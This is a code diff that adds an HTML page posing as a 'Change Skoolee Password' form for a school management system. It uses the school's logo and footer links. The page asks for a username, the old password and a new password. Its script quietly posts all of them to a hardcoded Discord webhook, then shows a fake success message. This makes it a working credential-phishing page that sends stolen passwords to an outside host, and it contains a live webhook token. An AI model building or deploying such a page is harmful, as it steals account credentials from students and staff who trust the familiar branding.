@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Change Skoolee Password</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f9;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            flex-direction: column;
+        }
+        .container {
+            background: #fff;
+            padding: 20px 40px;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            max-width: 400px;
+            width: 100%;
+            text-align: center;
+        }
+        .container img {
+            max-width: 100px;
+            margin-bottom: 20px;
+        }
+        .container h2 {
+            margin-bottom: 20px;
+            font-size: 24px;
+            color: #333;
+        }
+        .container input[type="text"], 
+        .container input[type="password"] {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+        .container input[type="submit"] {
+            background: #007bff;
+            color: #fff;
+            padding: 10px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+        .container input[type="submit"]:hover {
+            background: #0056b3;
+        }
+        .footer {
+            margin-top: 20px;
+            text-align: center;
+            font-size: 14px;
+            color: #777;
+        }
+        .footer a {
+            color: #007bff;
+            text-decoration: none;
+        }
+        .footer a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="https://atis.skoolee.com/Skoolee/UploadFile/Schools/School-student-management-information-system-Skoolee-logo-2.png?" alt="Logo">
+        <h2>Change Skoolee Password</h2>
+        <form id="passwordForm">
+            <input type="text" name="username" placeholder="Username" required>
+            <input type="password" name="old-password" placeholder="Old Password" required>
+            <input type="password" name="new-password" placeholder="New Password" required>
+            <input type="password" name="confirm-new-password" placeholder="Confirm New Password" required>
+            <input type="submit" value="Submit">
+        </form>
+    </div>
+    <div class="footer">
+        &copy; Atakamul All rights reserved.<br>
+        <a href="https://atis.skoolee.com">atis.skoolee.com</a> | <a href="https://www.atakamul.edu.kw">atakamul.edu.kw</a>
+    </div>
+    <script>
+        document.getElementById('passwordForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+
+            const formData = {
+                username: document.querySelector('input[name="username"]').value,
+                oldPassword: document.querySelector('input[name="old-password"]').value,
+                newPassword: document.querySelector('input[name="new-password"]').value,
+                confirmNewPassword: document.querySelector('input[name="confirm-new-password"]').value
+            };
+            const webhookUrl = 'https://discord.com/api/webhooks/1242108889718194196/oyvAt6L06ym9LqCHnXms47tsSNTXqmHqtpZu8SfOHiv1U7kxgW6J3qZFbhA2zLnTNsHn';
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({content: JSON.stringify(formData)})
+            })
+            .then(response => {
+                if (response.ok) {
+                alert('Password change request submitted successfully !');
+                }
+            });
+        });
+    </script>
+</body>
+</html>
